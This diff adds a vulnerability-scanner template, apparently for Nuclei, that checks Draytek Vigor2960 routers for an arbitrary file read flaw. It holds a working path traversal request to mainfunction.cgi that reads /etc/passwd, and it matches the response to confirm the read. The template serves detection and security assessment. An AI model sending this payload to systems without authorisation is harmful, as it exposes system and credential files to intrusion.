@@ -1,0 +1,31 @@
+id: draytek-vigor2960-file-read
+info:
+  name: Draytek Vigor 2960 File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Vigor2960 is a dual-WAN broadband router/VPN gateway. Vigor2960 v1.5.1.4 has an arbitrary file read vulnerability that allows attackers to read files such as source code and database configurations, putting the website at risk.
+  reference:
+    - https://github.com/xxy1126/Vuln/blob/main/Draytek/3.md
+  classification:
+    cvss-score: 9.8
+    cpe: cpe:/a:draytek:vigor2960:1.5.1.4
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /cgi-bin/mainfunction.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=getSyslogFile&option=../../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - ":0:r"
